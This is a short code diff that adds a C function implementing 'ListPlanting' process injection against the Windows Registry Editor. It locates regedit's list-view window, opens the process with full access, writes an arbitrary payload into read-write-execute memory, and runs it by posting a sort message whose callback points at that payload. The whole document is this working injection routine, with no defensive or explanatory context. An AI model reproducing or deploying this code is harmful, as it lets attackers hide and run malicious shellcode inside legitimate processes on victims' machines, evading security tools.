@@ -1,0 +1,28 @@
+VOID listplanting(LPVOID payload, DWORD payloadSize) {
+    HANDLE        hp;
+    DWORD         id;
+    HWND          lvm;
+    LPVOID        cs;
+    SIZE_T        wr;
+    
+    // 1. get the window handle
+    lvm = FindWindow(L"RegEdit_RegEdit", NULL);
+    lvm = FindWindowEx(lvm, 0, L"SysListView32", 0);
+   
+    // 2. Obtain the process id and try to open process
+    GetWindowThreadProcessId(lvm, &id);
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+
+    // 3. Allocate RWX memory and copy the payload there.
+    cs = VirtualAllocEx(hp, NULL, payloadSize,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+    
+    // 4. Trigger payload
+    PostMessage(lvm, LVM_SORTITEMS, 0, (LPARAM)cs);
+    
+    // 5. Free memory and close process handle
+    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+    CloseHandle(hp);
+}
